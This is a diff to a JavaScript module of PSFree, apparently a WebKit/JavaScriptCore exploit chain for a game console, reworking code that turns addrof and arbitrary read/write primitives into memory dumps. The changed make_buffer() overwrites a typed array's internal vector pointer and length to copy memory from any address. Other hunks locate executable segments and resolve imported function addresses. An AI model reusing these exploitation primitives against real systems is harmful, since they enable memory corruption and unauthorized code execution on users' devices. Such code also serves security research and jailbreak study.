@@ -1,4 +1,4 @@
-/* Copyright (C) 2023 anonymous
+/* Copyright (C) 2023-2024 anonymous
 
 This file is part of PSFree.
 
@@ -26,40 +26,59 @@ import { read32 } from './rw.mjs';
 import * as rw from './rw.mjs';
 import * as o from './offset.mjs';
 
+// creates an ArrayBuffer whose contents is copied from addr
 export function make_buffer(addr, size) {
     // see enum TypedArrayMode from
     // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
     // at webkitgtk 2.34.4
     //
-    // views with m_mode < WastefulTypedArray don't have a ArrayBuffer object
-    // associated with them, if we ask for view.buffer, it will be created on
-    // the fly
-    const mode_fast = 0;
-    const u = new Uint8Array(1);
+    // see possiblySharedBuffer() from
+    // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
+    // at webkitgtk 2.34.4
+    //
+    // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
+    // associated with them, if we ask for view.buffer, the view will be
+    // converted into a WastefulTypedArray and an ArrayBuffer will be created.
+    //
+    // We will create an OversizeTypedArray via requesting an Uint8Array whose
+    // number of elements will be greater than fastSizeLimit (1000).
+    //
+    // We will not use a FastTypedArray since its m_vector is visited by the
+    // GC and we will temporarily change it. The GC expects addresses from the
+    // JS heap, and that heap has metadata that the GC uses. The GC will likely
+    // crash since valid metadata won't likely be found at arbitrary addresses.
+    //
+    // The FastTypedArray approach will have a small time frame where the GC
+    // can inspect the invalid m_vector field.
+    //
+    // Views created via "new TypedArray(x)" where "x" is a number will always
+    // have an m_mode < WastefulTypedArray.
+    const u = new Uint8Array(1001);
     const u_addr = mem.addrof(u);
 
+    // we won't change the butterfly and m_mode so we won't save those
     const old_addr = u_addr.read64(o.view_m_vector);
-    u_addr.write64(o.view_m_vector, addr);
-
     const old_size = u_addr.read32(o.view_m_length);
+
+    u_addr.write64(o.view_m_vector, addr);
     u_addr.write32(o.view_m_length, size);
 
-    const old_mode = u_addr.read32(o.view_m_mode);
-    // force mode to FastTypedArray
-    u_addr.write32(o.view_m_mode, mode_fast);
+    const copy = new Uint8Array(u.length);
+    copy.set(u);
 
-    const res = u.buffer;
+    // We can't use slowDownAndWasteMemory() on u since that will create a
+    // JSC::ArrayBufferContents with its m_data pointing to addr. On the
+    // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
+    // cause a crash if the m_data is not from the fastMalloc heap, and even if
+    // it is, freeing abitrary addresses is dangerous as it may lead to a
+    // use-after-free.
+    const res = copy.buffer;
 
     // restore
     u_addr.write64(o.view_m_vector, old_addr);
     u_addr.write32(o.view_m_length, old_size);
-    u_addr.write32(o.view_m_mode, old_mode);
 
     return res;
-}
-
-function eq(a, b) {
-    return (a.low() === b.low()) && (a.high() === b.high());
 }
 
 // these values came from analyzing dumps from CelesteBlue
@@ -88,7 +107,7 @@ function check_magic_at(p, is_text) {
     const magic = is_text ? text_magic : data_magic;
     const value = [p.read64(0), p.read64(8)];
 
-    return eq(value[0], magic[0]) && eq(value[1], magic[1]);
+    return value[0].eq(magic[0]) && value[1].eq(magic[1]);
 }
 
 // Finds the base address of a segment: .text or .data
@@ -156,7 +175,7 @@ export function resolve_import(import_addr) {
     // of the next instruction. This means that the actual address used is
     // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
     // jump instruction, which is 6 in this case.
-    const function_addr = import_addr.add(offset.add(6)).readp(0);
+    const function_addr = import_addr.readp(offset.add(6));
 
     return function_addr;
 }
